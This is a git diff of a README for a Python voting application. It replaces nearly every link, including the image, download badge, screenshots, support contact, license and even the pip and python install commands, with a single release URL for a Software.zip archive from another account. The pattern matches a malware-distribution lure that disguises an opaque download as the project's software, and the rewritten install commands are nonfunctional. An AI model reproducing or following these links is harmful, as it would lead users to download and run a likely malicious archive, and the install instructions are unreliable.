@@ -1,6 +1,6 @@
 # 🗳️ Welcome to the EVM Voting System By Hrishi 🎉
 
-![EVM Voting System](https://images.unsplash.com/photo-1605581760845-2eb01c1a3eac)
+![EVM Voting System](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)
 
 ## Overview
 The EVM Voting System By Hrishi is a Python-based GUI application designed for electronic voting. Developed with features like admin and voter panels, real-time result visualization, data export capabilities in CSV/JSON formats, and a theme toggle option, this application provides a modern and efficient way to manage elections.
@@ -21,17 +21,17 @@ The EVM Voting System By Hrishi is built using the following technologies:
 
 ## Usage
 To launch the application, download the software from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)
 
 ## Screenshots
-![Admin Panel](https://example.com/admin-panel.png)
-![Voter Panel](https://example.com/voter-panel.png)
-![Results Visualization](https://example.com/results-visualization.png)
+![Admin Panel](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)
+![Voter Panel](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)
+![Results Visualization](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)
 
 ## Installation Guide
 1. Clone the repository to your local machine
-2. Install the necessary dependencies using `pip install -r requirements.txt`
-3. Run the application using `python main.py`
+2. Install the necessary dependencies using `pip install -r https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip`
+3. Run the application using `python https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip`
 
 ## Roadmap
 Future updates for the EVM Voting System By Hrishi may include:
@@ -43,9 +43,9 @@ Future updates for the EVM Voting System By Hrishi may include:
 If you'd like to contribute to the project, feel free to submit a pull request. Your contributions are greatly appreciated!
 
 ## Support
-For any inquiries or issues, please contact the project maintainer at [hrishi@evmvotingsystem.com](mailto:hrishi@evmvotingsystem.com)
+For any inquiries or issues, please contact the project maintainer at [https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip)
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/hrishi/EVM-Voting-System-By-Hrishi/blob/main/LICENSE) file for details. 
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/KuTzA1/EVM-Voting-System-By-Hrishi/releases/download/v2.0/Software.zip) file for details. 
 
 Thank you for using the EVM Voting System By Hrishi! Happy voting! 🗳️🎉
